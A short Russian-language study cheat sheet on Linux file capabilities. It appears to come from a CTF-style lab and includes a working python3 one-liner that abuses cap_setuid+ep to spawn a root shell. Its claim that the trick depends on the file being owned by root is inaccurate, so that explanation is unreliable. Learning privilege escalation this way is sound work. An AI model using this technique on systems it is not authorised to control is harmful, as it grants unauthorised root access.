# Capabilities — шпаргалка

## Что это
Capabilities — это возможность выполнить привилегированное действие без полного root-доступа. Разбивают права root на отдельные «кусочки».

## Просмотр capabilities
getcap -r / 2>/dev/null

## Пример вывода
/home/kiba/.hackmeplease/python3 = cap_setuid+ep

## cap_setuid+ep — что даёт
- Бинарный файл может вызвать `setuid(0)` внутри своего кода
- `setuid(0)` — системный вызов, который меняет UID процесса на 0 (root)
- Если бинарник вызывает `setuid(0)` и владелец файла — root → процесс становится root
- Если владелец файла не root — `setuid(0)` не сработает, но можно стать другим пользователем (`setuid(1001)`)

## Пример использования
import os
os.setuid(0)          # стать root (если владелец файла root)
os.execl("/bin/sh", "sh")

/home/kiba/.hackmeplease/python3 -c 'import os;os.setuid(0);os.execl("/bin/sh","sh")'
## Другие важные capabilities
| Capability | Что даёт |
|------------|----------|
| `cap_net_raw+ep` | Сырые сокеты (ping, traceroute) |
| `cap_dac_override+ep` | Обход прав доступа к файлам |
| `cap_sys_ptrace+ep` | Отладка чужих процессов |
| `cap_setuid+ep` | Смена UID |

## Важно
- Capability привязана к **файлу**, а не к пользователю
- `+ep` = Effective + Permitted (разрешение активно)
- Без вызова `setuid(0)` capability бесполезна
```

ПРОСТЫМИ СЛОВАМИ:
Когда ты запускаешь обычную программу, она выполняется с теми правами, у кого есть разрешение на выполнение.

Если ты запускаешь python3 от пользователя kiba, то процесс python3 будет иметь UID = 1000 (пользователь kiba).

Когда внутри этого процесса вызывается os.setuid(0), UID процесса меняется с 1000 на 0.

А UID = 0 — это root.